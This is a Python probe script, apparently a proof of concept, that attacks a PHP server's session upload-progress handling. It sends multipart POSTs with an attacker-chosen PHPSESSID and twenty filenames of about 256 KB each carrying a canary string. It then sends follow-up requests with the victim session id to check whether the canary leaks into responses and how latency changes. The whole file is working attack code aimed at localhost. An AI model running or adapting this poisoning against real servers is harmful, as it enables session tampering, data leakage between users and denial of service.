#!/usr/bin/env python3
"""Stage-3 segmented probe. Subcommands:
  baseline PORT N            -> N plain GETs, CSV + stats to stdout
  poison   PORT SID CANARY   -> one canary-laced poison, timeout-25s aware
  followup PORT N SID        -> N mixed GETs (same-sid / new sessions)
  multi    PORT SID          -> one small multipart probe (session consumer)
Every request row: sub,tag,sid,status,latency_s,body_len,canary_in_body,note
"""
import http.client, sys, time

def part(name, value, fname=None):
    b = "--BND\r\nContent-Disposition: form-data; name=\"%s\"" % name
    if fname is not None:
        b += "; filename=\"%s\"" % fname
    b += "\r\n\r\n"
    return b.encode() + value + b"\r\n"

def poison_body(sid, canary):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", b"dk")
    for i in range(20):
        fn = canary + "_%02d_" % i + "A" * (262144 - 40) + canary[-4:]
        b += part("p%d" % i, b"X", fn)
    return b + b"--BND--\r\n"

def multi_body(sid, key):
    return (part("PHPSESSID", sid.encode()) +
            part("PHP_SESSION_UPLOAD_PROGRESS", key.encode()) +
            part("f0", b"DATA", "s.txt") + b"--BND--\r\n")

def report(sub, tag, sid, st, dt, body, canary=b"", note=""):
    hit = 0
    if canary and canary in body:
        hit = 1
    print("%s,%s,%s,%s,%.3f,%d,%d,%s" % (sub, tag, sid, st, dt, len(body), hit, note), flush=True)

def req(port, method, sid=None, body=None, timeout=25):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    t0 = time.perf_counter()
    try:
        if method == "GET":
            h = {"Cookie": "PHPSESSID=%s" % sid} if sid else {}
            c.request("GET", "/", headers=h)
        else:
            c.request("POST", "/", body, {
                "Content-Type": "multipart/form-data; boundary=BND",
                "Content-Length": str(len(body))})
        r = c.getresponse()
        data = r.read()
        return r.status, time.perf_counter() - t0, data, ""
    except Exception as e:
        return -1, time.perf_counter() - t0, b"", "%s:%s" % (type(e).__name__, str(e)[:60])
    finally:
        c.close()

sub = sys.argv[1]
port = int(sys.argv[2])
if sub == "baseline":
    n = int(sys.argv[3])
    lat = []
    for i in range(n):
        st, dt, body, err = req(port, "GET", timeout=10)
        report(sub, "get", "-", st, dt, body, note=err)
        if dt > 0:
            lat.append(dt)
    if lat:
        lat.sort()
        print("#stats n=%d min=%.4f med=%.4f max=%.4f mean=%.4f" % (
            len(lat), lat[0], lat[len(lat)//2], lat[-1], sum(lat)/len(lat)))
elif sub == "poison":
    sid, canary = sys.argv[3], sys.argv[4]
    body = poison_body(sid, canary)
    st, dt, data, err = req(port, "POST", body=body, timeout=25)
    report(sub, "poison", sid, st, dt, data, canary=canary.encode(), note=err)
    sys.stderr.write(data[:600].decode("utf-8", "replace") + "\n")
elif sub == "followup":
    n = int(sys.argv[3])
    victimsid = sys.argv[4]
    for i in range(n):
        sid = victimsid if i % 2 == 0 else None
        st, dt, body, err = req(port, "GET", sid=sid, timeout=7)
        report(sub, "get_sid" if sid else "get_nosid", sid or "-", st, dt, body, note=err)
elif sub == "multi":
    sid = sys.argv[3]
    body = multi_body(sid, "mk")
    st, dt, data, err = req(port, "POST", body=body, timeout=15)
    report(sub, "multi", sid, st, dt, data, note=err)
    sys.stderr.write(data[:600].decode("utf-8", "replace") + "\n")
